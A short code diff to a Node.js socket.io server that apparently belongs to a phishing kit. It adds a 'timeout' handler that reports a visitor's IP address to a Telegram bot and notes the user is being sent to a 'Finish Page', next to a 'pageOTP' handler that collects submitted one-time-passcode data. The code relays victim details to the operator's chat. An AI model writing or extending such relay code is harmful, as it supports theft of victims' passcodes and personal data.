@@ -222,6 +222,13 @@ io.on('connection', (socket, req) => {
         //console.log(data)
     })
 
+    socket.on('timeout', () => {
+        if(userIP){
+            let message = `Time out, we send the user to Finish Page\n\nIP:${userIP}`;
+            bot.sendMessage(chatId, message);
+        }
+    })
+
      socket.on('pageOTP', (data) => {
         if(userIP){
             user = data
